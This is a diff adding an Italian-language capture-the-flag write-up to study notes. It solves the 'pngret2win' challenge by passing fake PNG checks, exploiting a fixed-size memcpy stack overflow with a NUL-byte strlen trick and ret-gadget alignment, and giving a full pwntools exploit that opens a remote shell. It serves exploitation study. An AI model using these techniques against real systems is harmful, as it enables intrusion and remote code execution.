@@ -397,6 +397,51 @@ print(p.recvall())           # ccit{wH4t_4b0u7_7H3_wH173_r48817??}
 
 `b"FOUND"` è tematico ma non necessario: basterebbe `b"A"*32 + b"\x01"`, un solo byte diverso da zero. Qui PIE e RELRO non contano nulla — non serve nessun indirizzo, l'overflow è **relativo** tra due globali adiacenti ed è il programma stesso a chiamare `win()`. Differenza con pleaselogin: lì era un off-by-one sullo stack (`read` di 33 in un buffer da 32), qui è una `read` sovradimensionata (36 vs 32) in `.bss`, senza il problema del `\n` perché non c'è nessuna ripulitura dopo la `read`.
 
+### pngret2win · ret2win con validazioni PNG, NUL e allineamento movaps
+
+File: `exercices/pwn/pngret2win/image_check` e `exploit.py`. `checksec`: No PIE, No canary, stack eseguibile. Ret2win, ma prima devi far finta di mandare un PNG valido superando cinque controlli, e l'ultimo intreccio (NUL + `IEND`) è la parte interessante.
+
+`main` legge una riga con `fgets` in un buffer globale `input_buffer` e ne calcola `bytesRead = strlen(input_buffer)` (quindi **fino al primo byte NUL**). Poi, in ordine:
+
+| Controllo | Cosa pretende |
+|---|---|
+| `check_file_length` | `30 ≤ bytesRead ≤ 511` |
+| `check_magic_bytes` | `memcmp(input, "\x89PNG", 4)` → i **byte veri** `89 50 4e 47` all'inizio (non la stringa `"89504E47"`!) |
+| `check_marker_at_offset` | `memcmp(input+32, "IHDR", 4)` → `IHDR` a **offset 32** |
+| `check_checksum` | somma di tutti i byte **pari**: `(somma & 1) == 0` |
+| `process_image` | `memcpy(buf[64], input, 0x200)` → copia **512 byte fissi** in un buffer da 64 → overflow, return address a **offset 72** |
+
+`process_image` sovrascrive il proprio return con l'indirizzo di `win`. Ma `win` non stampa subito il flag: richiama lei stessa `check_end_marker(input, bytesRead)`, e solo se passa esegue `system("/bin/sh")` (altrimenti `exit`).
+
+```c
+// check_end_marker: l'IEND deve stare appena prima della fine misurata da strlen
+return memcmp(input + bytesRead - 5, "IEND", 4) == 0;   // IEND + 1 byte + (il NUL a bytesRead)
+```
+
+**Il trucco del NUL.** L'indirizzo di `win` (`0x4013f9`) contiene dei NUL: messo a offset 72, il primo NUL cade a offset 75, quindi `strlen` dà `bytesRead = 75` e `check_end_marker` cerca `IEND` a offset 70–73, non dove lo metti tu. La soluzione sfrutta due fatti: `fgets` **non** si ferma sui NUL (solo sul `\n`) e il `memcpy` copia 512 byte **fissi**. Quindi puoi piantare `IEND` + 1 byte + `\x00` **prima** di offset 72: il NUL fissa `bytesRead` dove vuoi tu, `check_end_marker` trova `IEND`, e `win` a offset 72 viene copiato lo stesso.
+
+**L'allineamento.** Saltando dritto a `win`, `system` crasha su `movaps` perché lo stack non è allineato a 16: serve un `ret` gadget prima di `win`. Dettagli in [[Allineamento dello Stack (movaps)]].
+
+```python
+exe = context.binary = ELF("./image_check")
+ret = ROP(exe).find_gadget(['ret'])[0]
+
+payload  = b"\x89PNG"                        # offset 0: magic bytes VERI
+payload += b"a"*27 + b"b"                     # 4..31: padding
+payload += b"IHDR"                            # 32: marker richiesto a offset 32
+payload += b"g"*(64 - len(payload))          # fino a offset 64
+payload += b"b"*2 + b"IEND" + b"X" + b"\x00" # 64..71: IEND + 1 byte + NUL → bytesRead = 71
+payload += p64(ret) + p64(exe.symbols['win'])# 72: ret gadget (allinea), 80: win
+
+io = remote(host, port)        # process(...) per provare in locale
+io.sendlineafter(b":\n", payload)
+io.interactive()               # system("/bin/sh") → cat flag
+# ccit{https://www.youtube.com/watch?v=ZHgyQGoeaB0}
+```
+
+> [!note] Perché i byte di padding sono proprio quelli
+> Oltre a mettere `IHDR`/`IEND` al posto giusto, i filler (`a`, `b`, `g`, `X`) vanno scelti in modo che la **somma dei byte fino al NUL** resti pari (`check_checksum`). Cambiando un filler cambi la parità: è l'ultima manopola da aggiustare.
+
 ### roppery · Leak del canary + ROP a `execve` su un menu a due primitive
 
 Obiettivo: shell con `execve("/bin/sh", NULL, NULL)` su un binario con **canary** attivo, **NX**, Partial RELRO, **No PIE**, SHSTK/IBT marcati. È la sintesi di tutto il resto della nota: un *leak* per battere il canary + una catena **ROP** con gadget "sporchi" + `/bin/sh` già nel binario.
